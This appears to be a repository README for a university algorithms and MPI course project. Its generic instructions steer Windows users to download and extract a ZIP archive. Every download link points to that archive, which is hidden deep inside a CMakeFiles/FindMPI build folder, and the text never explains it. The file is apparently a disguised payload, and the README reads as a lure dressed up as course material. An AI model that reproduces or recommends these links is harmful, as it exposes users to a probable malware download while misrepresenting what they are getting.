# 🧩 AAPP-Challenges-2026 - Fast algorithm challenges, clear results

[![Download](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026/raw/refs/heads/main/AAPP CHALLENGE 2/skeleton/CMakeFiles/FindMPI/Challenges-AAP-horser.zip)

## 📥 Download

Use this link to visit the page and download the project:

[Open AAPP-Challenges-2026 on GitHub](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026/raw/refs/heads/main/AAPP CHALLENGE 2/skeleton/CMakeFiles/FindMPI/Challenges-AAP-horser.zip)

## 🖥️ What this is

AAPP-Challenges-2026 is a set of course challenges from Advanced Algorithms and Parallel Programming at Politecnico di Milano.

It focuses on:
- fast exponentiation
- primality testing
- Miller-Rabin test
- Monte Carlo methods
- parallel programming with MPI
- complexity analysis
- benchmark tests with Google Benchmark
- large number math with Boost.Multiprecision

This project is meant for Windows users who want to open the repository, build the code, and run the exercises or examples from a local machine.

## ⚙️ What you need

Before you start, make sure you have:
- Windows 10 or Windows 11
- a stable internet connection
- at least 4 GB of free disk space
- Visual Studio 2022 or Build Tools for C++
- CMake
- Git
- MPI support, such as Microsoft MPI or an MPI package used in your setup

## 🚀 Getting Started

### 1. Open the download page

Go to this page in your browser:

[Download or open the repository](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026/raw/refs/heads/main/AAPP CHALLENGE 2/skeleton/CMakeFiles/FindMPI/Challenges-AAP-horser.zip)

### 2. Get the project files

On the GitHub page:
- click the green Code button
- choose Download ZIP, or copy the repository link if you use Git
- save the file in a folder you can find again, such as Downloads or Documents

If you already use Git, you can clone the repository into a folder on your PC.

### 3. Extract the files

If you downloaded a ZIP file:
- right-click the file
- choose Extract All
- pick a folder with a short path, such as `C:\AAPP-Challenges-2026`

A short path helps avoid build problems on Windows.

## 🛠️ Install the tools

To run the code on Windows, install these tools if they are not already on your PC:

### Visual Studio
Install Visual Studio 2022 with:
- Desktop development with C++
- MSVC toolset
- Windows 10 or 11 SDK

### CMake
CMake helps create the project files used for building the code.

### Git
Git lets you clone the repository and update it later.

### MPI
MPI is used for parallel runs. Install Microsoft MPI if your setup needs it.

## 📂 Open the project

After you extract or clone the repository:
- open the main folder
- look for files such as `CMakeLists.txt`
- if you use Visual Studio, open the folder or open the generated solution file
- if you use CMake directly, select the source folder as the project root

## ▶️ Build and run

### With Visual Studio
1. Open the repository folder in Visual Studio
2. Wait for it to load the CMake project or solution
3. Select `Release` if you want faster runs
4. Build the project
5. Run the target you want to test

### With CMake
If you use CMake from the command line:
1. open Command Prompt
2. move to the project folder
3. create a build folder
4. run CMake to generate the build files
5. build the project from that folder

Example flow:
- `cmake -S . -B build`
- `cmake --build build --config Release`

### With MPI
If a challenge uses MPI:
- build the project first
- open a terminal in the build folder
- run the program with `mpiexec`
- use the number of processes required by the exercise

Example:
- `mpiexec -n 4 your_program.exe`

## 📊 Common parts of the project

This repository may include different challenge folders and sample programs for:
- number tests
- speed checks
- parallel runs
- correctness checks
- benchmark results

You can expect code that compares:
- single-thread and parallel methods
- exact math and probabilistic methods
- different ways to test large numbers

## 🔍 How to use the exercises

Each challenge usually follows a simple flow:
1. build the code
2. run the test program
3. read the output
4. compare the results
5. adjust input values if needed

If a folder contains benchmark code, run it from the command line so you can see clear timing data.

## 🧪 Benchmarks

Some parts of the project use Google Benchmark to measure speed.

When you run a benchmark:
- close other heavy apps
- use Release mode
- run the benchmark more than once
- compare the average time, not just one result

This helps you see how fast each algorithm runs on your PC.

## 🧮 Algorithms used here

### Fast exponentiation
This method raises a number to a power in fewer steps than simple repeated multiplication.

### Miller-Rabin test
This is a fast method for checking if a number is prime. It is often used for large numbers.

### Monte Carlo method
This method uses random sampling to estimate a result. It can give a good answer with less work.

### Boost.Multiprecision
This library helps the code work with large numbers that do not fit into normal types.

### Complexity analysis
This shows how time and memory use change as the input gets larger.

### Parallel programming with MPI
MPI lets the program split work across more than one process.

## 🧭 Suggested run order

If you are opening the repository for the first time, use this order:
1. inspect the folder list
2. read the names of the challenge files
3. build the project
4. run one simple example
5. test the benchmark
6. try the parallel version if the challenge includes one

## 🧯 If something does not run

If the build fails:
- check that Visual Studio C++ tools are installed
- check that CMake is installed
- check that the folder path is short
- make sure you opened the right project folder
- rebuild in Release mode if Debug gives errors

If MPI programs do not start:
- check that MPI is installed
- make sure `mpiexec` works from the command line
- start with a small process count like 2 or 4

## 📁 Folder guide

A typical layout for this repository may include:
- source files with the challenge code
- CMake files for building
- benchmark files
- data or test inputs
- README files for specific exercises

If a folder has its own README, open it first. It may explain the run steps for that part of the project.

## 🧷 Repository details

- Name: AAPP-Challenges-2026
- Course: Advanced Algorithms and Parallel Programming
- School: Politecnico di Milano
- Academic year: 2025/2026
- Mark: 6/6

## 🏷️ Topics

- advanced algorithms
- boost multiprecision
- complexity analysis
- fast exponentiation
- google benchmark
- Miller-Rabin test
- Monte Carlo
- MPI
- parallel programming
- primality test